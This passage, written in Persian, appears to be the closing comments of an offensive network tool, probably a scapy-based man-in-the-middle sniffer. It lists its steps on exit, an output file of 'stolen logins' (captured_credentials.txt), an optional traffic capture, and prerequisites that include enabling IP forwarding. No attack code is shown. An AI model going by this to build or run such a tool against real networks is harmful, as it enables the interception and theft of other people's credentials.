# ۲. IP Forwarding غیرفعال می‌شود
# ۳. خلاصه حمله چاپ می‌شود
# ۴. اطلاعات دزدیده شده در captured_credentials.txt ذخیره می‌شود

# ============================================================
# 📁 فایل‌های خروجی
# ============================================================
# captured_credentials.txt → لاگین‌های دزدیده شده
# [pcap_name]             → ترافیک ذخیره شده (با --pcap)

# ============================================================
# ⚠️ پیش‌نیازها
# ============================================================
# sudo pip install scapy
# sudo sysctl net.ipv4.ip_forward=1  # یا خود کد فعال می‌کند
```
### !